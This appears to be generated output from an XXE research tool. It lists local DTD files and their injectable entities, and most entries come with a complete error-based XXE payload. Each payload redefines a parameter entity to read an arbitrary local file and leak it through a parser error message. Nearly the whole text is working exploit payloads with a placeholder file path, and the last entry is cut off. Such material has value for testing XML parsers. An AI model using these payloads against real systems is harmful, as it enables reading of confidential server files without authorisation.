 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `boost.function.semantics`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % boost.function.semantics 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `library.content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % library.content 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `boost.testsuite.test.content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % boost.testsuite.test.content 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd`

**Injectable entity:** `DocBook`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/target/test-classes/boostbook/boostbook.dtd">

    <!ENTITY % DocBook '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/yelp-dtd/docbookx.dtd`

**Injectable entity:** `ISOamsa`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/yelp-dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `publicIdentifier`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % publicIdentifier '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `partialPublicIdentifier`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % partialPublicIdentifier '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `uriReference`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % uriReference '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `string`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % string '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `systemOrPublic`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % systemOrPublic '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `nsdecl`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % nsdecl '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `public`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % public 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `system`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % system 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `uri`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % uri 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `rewriteSystem`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % rewriteSystem 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `rewriteURI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % rewriteURI 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `delegatePublic`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % delegatePublic 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `delegateSystem`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % delegateSystem 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `delegateURI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % delegateURI 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `nextCatalog`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % nextCatalog 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `group`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % group 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.catalog.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.catalog.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.public.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.public.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.system.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.system.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.uri.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.uri.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.rewriteSystem.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.rewriteSystem.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.rewriteURI.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.rewriteURI.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.delegatePublic.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.delegatePublic.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.delegateSystem.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.delegateSystem.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.delegateURI.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.delegateURI.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.nextCatalog.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.nextCatalog.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd`

**Injectable entity:** `local.group.attribs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/xmlcore/catalog.dtd">

    <!ENTITY % local.group.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/bibxmlext.dtd`

**Injectable entity:** `n.InProceedings`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/bibxmlext.dtd">

    <!ENTITY % n.InProceedings 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/bibxmlext.dtd`

**Injectable entity:** `n.PHDThesis`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/bibxmlext.dtd">

    <!ENTITY % n.PHDThesis 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/bibxmlext.dtd`

**Injectable entity:** `withMURL`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/bibxmlext.dtd">

    <!ENTITY % withMURL '(aa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/gapdoc.dtd`

**Injectable entity:** `InnerText`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/gapdoc.dtd">

    <!ENTITY % InnerText 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/gapdoc.dtd`

**Injectable entity:** `Text`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gapdoc/gapdoc.dtd">

    <!ENTITY % Text 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gtksourceview/language.dtd`

**Injectable entity:** `itemattrs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/gtksourceview/language.dtd">

    <!ENTITY % itemattrs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/libgweather/locations.dtd`

**Injectable entity:** `name`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/libgweather/locations.dtd">

    <!ENTITY % name 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

**Injectable entity:** `URI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd">

    <!ENTITY % URI '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jspxml.dtd`

